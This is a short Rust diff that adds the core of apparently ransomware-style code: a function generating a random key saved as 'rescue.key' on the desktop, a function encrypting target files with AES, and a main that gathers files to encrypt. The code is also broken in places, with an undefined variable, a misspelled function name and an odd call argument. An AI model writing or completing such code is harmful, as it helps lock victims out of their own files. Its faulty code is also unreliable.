@@ -1,3 +1,4 @@
+use std::intrinsics::likely;
 use std::io::Write;
 use std::path::{Path, PathBuf};
 use std::fs::{read,write,OpenOptions};
@@ -29,3 +30,35 @@ fn fetch_files
     }
 }
 
+fn key_generate
+(desktop: &mut PathBuf) -> [u8;32]
+{
+    let key: [u8;32] = thread_rng().gen();
+
+    desktop.push("rescue.key");
+    write(desktop, key)
+        .expect("Key cannot be stored...");
+
+    return key;
+}
+
+fn encrypt_targer_files
+(path: &Path, encryptor: AesSafe128Encryptor) -> ()
+{
+
+    if let Ok(content) = read(path) {
+
+        if let Ok(mut writer) = AesWriter::new(file,encryptor) {
+            let _ = writer.write_all(&content);
+        }
+    }
+}
+
+fn main
+() -> ()
+{
+
+    // Find files
+    // Encrypt them,
+        fetch_files(",")
+}
